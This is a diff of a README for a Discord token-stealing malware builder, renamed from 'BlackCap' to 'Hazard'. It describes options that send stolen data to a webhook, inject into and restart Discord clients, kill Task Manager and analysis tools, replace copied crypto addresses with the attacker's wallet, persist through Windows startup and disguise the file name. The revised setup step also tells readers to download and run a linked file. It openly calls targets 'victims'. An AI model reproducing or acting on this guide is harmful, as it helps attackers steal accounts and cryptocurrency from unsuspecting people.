@@ -1,17 +1,15 @@
 🌐 〢 Content
-🎉・Setting up BlackCap
+🎉・Setting up Hazard
 🔰・Features
 👁️・Features Explanation
 📝・Changelog
 🕵️‍♂️・Credits
 💼・Term
-📁 〢 Setting up BlackCap
-Install Python
-Install BlackCap Files
-Install all requirements install.bat
-Click on start.bat start.bat
-Complete the configuration
-You have your .exe file enjoy :)
+📁 〢 Setting up Hazard
+Go to the Download file on the github 
+repository press the link or copy and paste into
+another tab and download file and run it for the builder to work
+after that copy your webhook and pate in the box above compile
 🔰 〢 Features
 > Default:
 
@@ -49,59 +47,55 @@ You have your .exe file enjoy :)
 👁️ 〢 Explanations of Features and options
 
 
-@blackcap: Here put your Discord Webhook you can find it in your 
-"DISCORD CHANNEL OPTIONS" > "INTEGRATION" > "CREATE A WEBHOOK"
+@hazard: Here put your final file name like who is not going to be obvious
 
 
-@blackcap: Here put your final file name like who is not going to be obvious
-
-
-@blackcap: This is a option to "KILL" all discord clients opened 
+@hazard: This is a option to "KILL" all discord clients opened 
 and to restart them with the blackcap injection 
 (so i recommand "yes")
 
 
-@blackcap: This is a option to "KILL" all process which could analyze the properties of blackcap, 
+@hazard: This is a option to "KILL" all process which could analyze the properties of blackcap, 
 such as the task manager, the terminal or even analysis tools (so i recommand "yes")
 
 
-@blackcap: This is a option to ping when someone run BlackCap you can specify "everyone" or "here"
+@hazard: This is a option to ping when someone run BlackCap you can specify "everyone" or "here"
 
 
-@blackcap: This option replaces each of the crypto addresses copied by the victim with yours, 
+@hazard: This option replaces each of the crypto addresses copied by the victim with yours, 
 it will not realize that it is not the same and during a payment the cryptomoney will be sent 
 to your address
 
 //Yeah, that OP i know
 
 
-@blackcap: If you chose 'yes' to the previous option you will have to fill in this with 
+@hazard: If you chose 'yes' to the previous option you will have to fill in this with 
 YOUR crypto wallet addresses 
 (You can also put mine)👌
 
 
-@blackcap: This option allows you to display an error message when someone launches your blackcap 
+@hazard: This option allows you to display an error message when someone launches your blackcap 
 for the moment it is a predefined message but later it will be customizable
 
 
-@blackcap: This option will make a copy of the .exe in the windows startup of your victims and 
+@hazard: This option will make a copy of the .exe in the windows startup of your victims and 
 blackcap will therefore launch at each start
 
 (if you have activated the address crypto replacer I advise you to activate this one)
 
 
-@blackcap: This option will close automatically the window that will launch blackcap 
+@hazard: This option will close automatically the window that will launch blackcap 
 (also works if you let the final file in .py so i recommand 'yes')
 
 
-@blackcap: This option will obfuscate the source code "BUT THIS OBFUSCATION WAS DETECTED"
+@hazard: This option will obfuscate the source code "BUT THIS OBFUSCATION WAS DETECTED"
 I recommand to chose 'no'
 
 
-@blackcap: This option will create an .exe if you put 'no' the final file will be an .py
+@hazard: This option will create an .exe if you put 'no' the final file will be an .py
 
 
-@blackcap: If you chose 'yes' in the previous option this option will add an icon to your .exe
+@hazard: If you chose 'yes' in the previous option this option will add an icon to your .exe
 💭 〢 ChangeLog
 v1.9 ⋮ 2022-26-10
 - bug fix to search token
